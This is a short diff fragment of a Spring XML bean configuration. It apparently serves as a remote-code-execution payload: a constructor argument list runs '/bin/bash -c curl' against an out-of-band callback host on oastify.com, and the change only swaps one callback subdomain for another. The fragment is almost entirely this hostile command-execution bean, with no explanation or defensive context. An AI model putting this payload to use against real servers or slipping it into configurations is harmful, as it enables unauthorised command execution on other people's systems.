@@ -11,7 +11,7 @@ http://www.springframework.org/schema/context/spring-context.xsd">
 <list>
 <value>/bin/bash</value>
 <value>-c</value>
-<value>curl h3lsh5bwsdrgghjf0z663w3ge7ky8n.oastify.com</value>
+<value>curl umk5sqq1jn0r4y558ax5fts3gumlaa.oastify.com</value>
 </list>
 </constructor-arg>
 </bean>
